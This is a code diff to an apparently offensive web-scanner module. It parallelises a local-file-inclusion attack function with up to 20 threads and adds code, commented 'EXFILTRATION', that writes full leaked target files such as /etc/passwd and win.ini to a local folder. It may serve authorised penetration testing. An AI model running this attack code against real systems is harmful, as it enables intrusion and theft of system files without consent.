@@ -1,6 +1,9 @@
 from typing import Any, Dict
 from ..http_client import HttpClient
 from ..scenarios import SimpleScenario
+import concurrent.futures
+import threading
+import time
 
 def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, Any]:
     """
@@ -27,9 +30,11 @@ def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
     fields = scenario.config.get("fields", ["file", "path"])
     issues = []
     leaked_data = [] # Capture what we found
-    
-    for field in fields:
-        for p in payloads:
+    lock = threading.Lock()
+
+    def check_lfi(task):
+        field, p = task
+        try:
             if scenario.method == "GET":
                 params = {field: p}
                 resp = client.send(scenario.method, scenario.target, params=params)
@@ -43,22 +48,44 @@ def run_lfi_attack(client: HttpClient, scenario: SimpleScenario) -> Dict[str, An
             if "root:x:0:0" in resp.text:
                 suspicious = True
                 reasons.append("Unix /etc/passwd content")
-                leaked_data.append(f"PASSWD FILE: {resp.text[:200]}")
+                with lock: leaked_data.append(f"PASSWD FILE: {resp.text[:200]}")
             if "[extensions]" in resp.text.lower() or "fonts" in resp.text.lower():
                 suspicious = True
                 reasons.append("Windows INI content")
-                leaked_data.append(f"WIN.INI: {resp.text[:200]}")
+                with lock: leaked_data.append(f"WIN.INI: {resp.text[:200]}")
                 
+            # EXFILTRATION: Save to Disk
             if suspicious:
-                issues.append(f"[CRITICAL] LFI in '{field}': {', '.join(reasons)}")
+                try:
+                    import os
+                    os.makedirs("exfiltrated_data", exist_ok=True)
+                    filename = f"lfi_{scenario.id}_{field}_{int(time.time())}.txt"
+                    path = os.path.join("exfiltrated_data", filename)
+                    with open(path, "w", encoding="utf-8") as f:
+                        f.write(f"Source: {scenario.method} {scenario.target}\nPayload: {p}\n\n--- CONTENT ---\n{resp.text}")
+                    with lock: leaked_data.append(f"[Saved to {path}]")
+                except Exception as e:
+                    pass
                 
+                with lock:
+                    issues.append(f"[CRITICAL] LFI in '{field}': {', '.join(reasons)}")
+        except Exception:
+            pass
+
+    # Build Tasks
+    tasks = []
+    for f in fields:
+        for p in payloads:
+            tasks.append((f, p))
+
+    # Parallel Execution
+    pool_size = 20 if scenario.config.get("aggressive") else 5
+    with concurrent.futures.ThreadPoolExecutor(max_workers=pool_size) as executor:
+        executor.map(check_lfi, tasks)
     
     # Confidence Logic
     confidence = "LOW"
     if issues:
-        # LFI is usually binary: either we see the file or we don't.
-        # If we added heuristic checks later, we'd downgrade this.
-        # But 'root:x:0:0' is definitive.
         confidence = "CONFIRMED"
 
     return {
